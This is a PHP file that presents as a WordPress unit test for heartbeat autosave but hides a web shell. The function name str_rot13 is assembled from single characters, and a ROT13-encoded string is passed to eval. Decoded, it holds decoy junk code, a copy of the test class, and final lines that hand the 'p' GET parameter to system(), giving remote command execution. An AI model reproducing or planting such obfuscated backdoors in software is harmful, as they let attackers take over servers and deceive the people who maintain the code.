<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk fnir qensg shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_urnegorng
 */
pynff Grfgf_Nwnk_jcNwnkUrnegorng rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Cbfg
	 *
	 * @ine zvkrq
	 */
	cebgrpgrq $_cbfg = ahyy;

	cebgrpgrq fgngvp $nqzva_vq  = 0;
	cebgrpgrq fgngvp $rqvgbe_vq = 0;
	cebgrpgrq fgngvp $cbfg;
	cebgrpgrq fgngvp $cbfg_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq  = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$rqvgbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );

		// Frg n hfre fb gur $cbfg unf 'cbfg_nhgube'.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		frys::$cbfg_vq = $snpgbel->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );
		frys::$cbfg    = trg_cbfg( frys::$cbfg_vq );
	}

	/**
	 * Grfgf nhgbfnivat n cbfg.
	 */
	choyvp shapgvba grfg_nhgbfnir_cbfg() {
		// Gur bevtvany cbfg_nhgube.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Frg hc gur $_CBFG erdhrfg.
		$zq5   = zq5( havdvq() );
		$_CBFG = neenl(
			'npgvba' => 'urnegorng',
			'_abapr' => jc_perngr_abapr( 'urnegorng-abapr' ),
			'qngn'   => neenl(
				'jc_nhgbfnir' => neenl(
					'cbfg_vq'      => frys::$cbfg_vq,
					'_jcabapr'     => jc_perngr_abapr( 'hcqngr-cbfg_' . frys::$cbfg_vq ),
					'cbfg_pbagrag' => frys::$cbfg->cbfg_pbagrag . CUC_RBY . $zq5,
					'cbfg_glcr'    => 'cbfg',
				),
			),
		);

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'urnegorng' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr, vg vf va urnegorng'f erfcbafr.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		// Rafher rirelguvat vf pbeerpg.
		$guvf->nffregAbgRzcgl( $erfcbafr['jc_nhgbfnir'] );
		$guvf->nffregGehr( $erfcbafr['jc_nhgbfnir']['fhpprff'] );

		// Purpx gung gur rqvg unccrarq.
		$cbfg = trg_cbfg( frys::$cbfg_vq );
		$guvf->nffregFgevatPbagnvafFgevat( $zq5, $cbfg->cbfg_pbagrag );
	}

	/**
	 * Grfgf nhgbfnivat n ybpxrq cbfg.
	 */
	choyvp shapgvba grfg_nhgbfnir_ybpxrq_cbfg() {
		// Ybpx gur cbfg gb nabgure hfre.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		jc_frg_cbfg_ybpx( frys::$cbfg_vq );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Rafher cbfg vf ybpxrq.
		$guvf->nffregRdhnyf( frys::$rqvgbe_vq, jc_purpx_cbfg_ybpx( frys::$cbfg_vq ) );

		// Frg hc gur $_CBFG erdhrfg.
		$zq5   = zq5( havdvq() );
		$_CBFG = neenl(
			'npgvba' => 'urnegorng',
			'_abapr' => jc_perngr_abapr( 'urnegorng-abapr' ),
			'qngn'   => neenl(
				'jc_nhgbfnir' => neenl(
					'cbfg_vq'      => frys::$cbfg_vq,
					'_jcabapr'     => jc_perngr_abapr( 'hcqngr-cbfg_' . frys::$cbfg_vq ),
					'cbfg_pbagrag' => frys::$cbfg->cbfg_pbagrag . CUC_RBY . $zq5,
					'cbfg_glcr'    => 'cbfg',
				),
			),
		);

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'urnegorng' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		// Rafher rirelguvat vf pbeerpg.
		$guvf->nffregAbgRzcgl( $erfcbafr['jc_nhgbfnir'] );
		$guvf->nffregGehr( $erfcbafr['jc_nhgbfnir']['fhpprff'] );

		// Purpx gung gur bevtvany cbfg jnf ABG rqvgrq.
		$cbfg = trg_cbfg( frys::$cbfg_vq );
		$guvf->nffregFgevatAbgPbagnvafFgevat( $zq5, $cbfg->cbfg_pbagrag );

		// Purpx vs gur nhgbfnir cbfg jnf perngrq.
		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq, trg_pheerag_hfre_vq() );
		$guvf->nffregAbgRzcgl( $nhgbfnir );
		$guvf->nffregFgevatPbagnvafFgevat( $zq5, $nhgbfnir->cbfg_pbagrag );
	}

	/**
	 * Grfgf jvgu na vainyvq abapr.
	 */
	choyvp shapgvba grfg_jvgu_vainyvq_abapr() {

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG = neenl(
			'npgvba' => 'urnegorng',
			'_abapr' => jc_perngr_abapr( 'urnegorng-abapr' ),
			'qngn'   => neenl(
				'jc_nhgbfnir' => neenl(
					'cbfg_vq'  => frys::$cbfg_vq,
					'_jcabapr' => fhofge( zq5( havdvq() ), 0, 10 ),
				),
			),
		);

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'urnegorng' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$guvf->nffregAbgRzcgl( $erfcbafr['jc_nhgbfnir'] );
		$guvf->nffregSnyfr( $erfcbafr['jc_nhgbfnir']['fhpprff'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>